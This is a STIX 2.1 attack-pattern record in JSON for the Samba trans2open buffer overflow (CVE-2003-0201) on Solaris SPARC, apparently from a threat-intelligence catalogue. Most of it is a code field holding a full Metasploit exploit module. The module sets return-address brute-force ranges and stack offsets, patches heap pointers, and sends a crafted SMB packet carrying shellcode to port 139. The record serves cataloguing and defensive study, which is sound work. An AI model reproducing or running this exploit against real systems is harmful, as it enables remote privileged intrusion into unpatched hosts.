{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6df09898-97f0-4eaf-a773-fa1444ff600a",
    "created": "2024-08-14T16:33:47.793008Z",
    "modified": "2024-08-14T16:33:47.793013Z",
    "name": "Samba trans2open Overflow (Solaris SPARC)",
    "description": " This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on Solaris SPARC systems that do not have the noexec stack option set. Big thanks to MC and valsmith for resolving a problem with the beta version of this module. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/samba/trans2open.rb",
            "external_id": "trans2open.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0201"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2003/Apr/103"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samba trans2open Overflow (Solaris SPARC)',\n      'Description'    => %q{\n          This exploits the buffer overflow found in Samba versions\n        2.2.0 to 2.2.8. This particular module is capable of\n        exploiting the flaw on Solaris SPARC systems that do not\n        have the noexec stack option set. Big thanks to MC and\n        valsmith for resolving a problem with the beta version of\n        this module.\n      },\n      'Author'         => [ 'hdm', 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2003-0201' ],\n          [ 'OSVDB', '4469' ],\n          [ 'BID', '7294' ],\n          [ 'URL', 'https://seclists.org/bugtraq/2003/Apr/103' ]\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n          'MinNops'  => 512,\n        },\n      'Platform'       => 'solaris',\n      'Targets'        =>\n        [\n          [ 'Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce',\n            {\n              'PtrToNonZero' => 0xffbffffc, # near the bottom of the stack\n              'Offset'       => 1103,\n              'Bruteforce'   =>\n                {\n                  'Start' => { 'Ret' => 0xffbffaf0 },\n                  'Stop'  => { 'Ret' => 0xffbfa000 },\n                  'Step'  => 128\n                }\n            }\n          ],\n\n          [ 'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce',\n            {\n              'PtrToNonZero' => 0xffbefffc, # near the bottom of the stack\n              'Offset'       => 1103,\n              'Bruteforce'   =>\n                {\n                  'Start' => { 'Ret' => 0xffbefaf0 },\n                  'Stop'  => { 'Ret' => 0xffbea000 },\n                  'Step'  => 128\n                }\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2003-04-07'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(139)\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def brute_exploit(addrs)\n\n    curr_ret = addrs['Ret']\n    begin\n      print_status(\"Trying return address 0x%.8x...\" %  curr_ret)\n\n      connect(versions: [1])\n      smb_login\n\n      #\n      # The obstacle course:\n      # \toutsize = smb_messages[type].fn(conn, inbuf,outbuf,size,bufsize);\n      # \tsmb_dump(smb_fn_name(type), 0, outbuf, outsize);\n      # \treturn(outsize);\n      #\n\n      # This value *must* be 1988 to allow findrecv shellcode to work\n      pattern = rand_text_english(1988)\n\n      #\n      # This was tested against sunfreeware samba 2.2.7a / solaris 9 / sun4u\n      #\n      # Patch the overwritten heap pointers\n      # substr($pattern, 1159, 4, pack('N', $target->[4]));\n      # substr($pattern, 1163, 4, pack('N', $target->[4]));\n      #\n      # >:-) smb_messages[ (((type << 1) + type) << 2) ] == 0\n      # substr($pattern, 1195, 4, pack('N', 0xffffffff));\n      #\n      # Fix the frame pointer (need to check for null in address)\n      # substr($pattern, 1243, 4, pack('N', $target->[3]-64));\n      #\n      # Finally set the return address\n      # substr($pattern, 1247, 4, pack('N', $curr_ret));\n      #\n\n      #\n      # This method is more reliable against a wider range of targets\n      #\n\n      off = target['Offset']\n      ptr_to_non_zero = target['PtrToNonZero']\n\n      # Local variable pointer patches for early versions of 2.2.x\n      pattern[off, 36] = [ptr_to_non_zero - 1024].pack('N') * 9\n      off += 36\n\n      # Overwrite heap pointers with a ptr to NULL at the top of the stack\n      pattern[off, 40] = [ptr_to_non_zero - 1024].pack('N') * 10\n      off += 40\n\n      # Patch the type index into the smb_messages[] array...\n      # >:-) smb_messages[ (((type << 1) + type) << 2) ] == 0\n      pattern[off, 20] = [0xffffffff].pack('N') * 5\n      off += 20\n\n      # This stream covers the framepointer and the return address\n      pattern[off, 400] = [curr_ret].pack('N') * 100\n\n      # Stuff the shellcode into the request\n      pattern[3, payload.encoded.length] = payload.encoded\n\n      trans =\n        \"\\x00\\x04\\x08\\x20\\xff\\x53\\x4d\\x42\\x32\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\"+\n        \"\\x64\\x00\\x00\\x00\\x00\\xd0\\x07\\x0c\\x00\\xd0\\x07\\x0c\\x00\\x00\\x00\\x00\"+\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd0\\x07\\x43\\x00\\x0c\\x00\\x14\\x08\\x01\"+\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\"+\n        pattern\n\n      sock.put(trans)\n      handler\n      disconnect\n\n    rescue EOFError\n    rescue => e\n      print_error(\"#{e}\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-04-07",
    "x_mitre_platforms": [
        "solaris'"
    ]
}